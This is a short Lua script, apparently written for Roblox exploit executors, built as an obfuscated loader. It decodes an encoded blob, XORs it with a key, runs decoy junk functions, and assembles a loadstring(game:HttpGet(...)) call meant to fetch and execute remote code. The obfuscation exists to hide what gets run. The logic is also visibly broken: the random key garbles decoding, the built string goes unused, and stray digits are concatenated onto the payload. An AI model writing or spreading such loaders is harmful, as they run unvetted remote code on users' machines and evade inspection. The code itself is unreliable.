local function obf1(s, k)
    local r = {}; for i = 1, #s do r[i] = string.char(bit.bxor(string.byte(s, i), k)) end
    return table.concat(r)
end

local obf2 = function(x) return (syn and syn.crypt.base64.decode or crypt.base64decode or function(s) return s end)(x) end
local encoded = "SkdWdFlXNXBZMkYwYVc5dUlHSmhjMlV1WTI5dE1qSmlhV1EwWld4c1lXUnpaV0ZzZEdGc1lYSmxjeTFqTWpJMVpHRmpaV1l6Wm1NeU5tTTJOVGM1WlRNd1lURXpOalZrTXpJelpXRTNZbVEzT1RSbE9XWXlNMlV5TnpJd05tTXhZbUk1WlRFek9URTJNVFl4Wm1SbVlqVmlNRGcx"
local key = math.random(10, 99) 

local function fake()
    local v1, v2, v3 = math.random(1000, 9999), math.random(1000, 9999), math.random(1000, 9999)
    local function hidden(x) return (x + v1) * v2 - v3 end
    return hidden(math.random(1000, 9999))
end

for i = 1, 50 do fake() end

local function genCode()
    local a, b, c = math.random(1, 9), math.random(10, 99), math.random(100, 999)
    local d = string.reverse(tostring(a * b + c))  
    return d  
end

local x1, x2, x3 = genCode(), genCode(), genCode()
local hidden_code = obf1(obf2(encoded), key)
local obf_final = string.format("return function(...) loadstring(game:HttpGet('%s'))() end", hidden_code)

local function execute() 
    local t = {x1, x2, x3, hidden_code} 
    local final = table.concat(t, "")
    loadstring(final)()
end

execute()
